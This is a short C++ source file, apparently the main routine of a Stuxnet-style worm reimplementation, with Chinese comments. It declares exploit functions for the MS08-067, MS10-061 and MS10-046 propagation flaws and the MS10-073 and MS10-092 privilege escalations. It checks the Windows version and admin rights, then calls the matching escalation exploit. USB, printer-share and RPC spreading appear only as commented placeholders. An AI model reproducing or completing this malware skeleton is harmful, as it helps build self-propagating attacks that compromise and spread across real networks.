// stuxnet_exploit.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include"include.h"

extern bool check_target_info(TargetInfo&);
extern bool check_admin();

//内网传播：rpc漏洞
extern void exp_ms08_067();
//内网传播：打印机共享漏洞
extern void exp_ms10_061();
//移动存储传播：lnk文件漏洞
extern void exp_ms10_046();

//键盘布局文件提权
extern void exp_ms10_073();
//计划任务本地提权
extern void exp_ms10_092();

int main()
{
    TargetInfo info;
    check_target_info(info);
    printf("current dwMajorVersion:%d dwMinorVersion: %d bIsWow64:%d", info.dwMajorVersion, info.dwMinorVersion, info.bIsWow64);
    
    if (check_admin() == FALSE)
    {
        //提权操作
        if (info.dwMajorVersion == 6 && info.dwMinorVersion<=1)
        {
            //[ 'Windows Vista', 'Windows 7', 'Windows 2008' ]
            exp_ms10_092();
        }
        else if(info.dwMajorVersion == 5 && info.dwMinorVersion <= 2)
        {
            //[ 'Windows 2000', 'Windows XP' ]
            exp_ms10_073();
        }
    }

    //本地存储传播-U盘传播

    //内网传播--打印机共享传播
    //内网传播--rpc传播
    
    return 0;
}
